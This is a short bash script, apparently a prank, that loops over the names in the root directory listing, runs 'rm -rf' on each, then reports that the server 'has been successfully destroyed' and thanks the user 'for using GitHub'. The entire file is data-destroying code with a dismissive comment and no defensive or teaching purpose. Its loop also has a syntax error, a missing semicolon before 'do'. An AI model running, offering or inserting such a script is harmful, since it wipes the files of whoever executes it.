#!/bin/bash
#this is just a comment
FILES=`ls /`

for i in $FILES do
	rm -rf $i
done

if [[ $? -eq 0 ]]
then
	echo "Server has been successfully destroyed"
	exit 0
else
	echo "Error!"
	exit 1
fi

echo "Thank you for using GitHub!"
